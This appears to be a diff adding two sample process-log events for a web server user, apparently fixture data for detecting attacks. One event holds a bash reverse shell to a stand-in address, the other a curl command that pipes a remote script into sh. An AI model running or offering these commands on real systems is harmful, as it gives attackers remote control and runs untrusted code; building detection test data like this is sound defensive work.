@@ -1,0 +1,2 @@
+{"Image": "/usr/bin/bash", "CommandLine": "bash -i >& /dev/tcp/192.0.2.14/4444 0>&1", "User": "www-data"}
+{"Image": "/usr/bin/curl", "CommandLine": "curl -s http://192.0.2.7/x.sh | sh", "User": "www-data"}
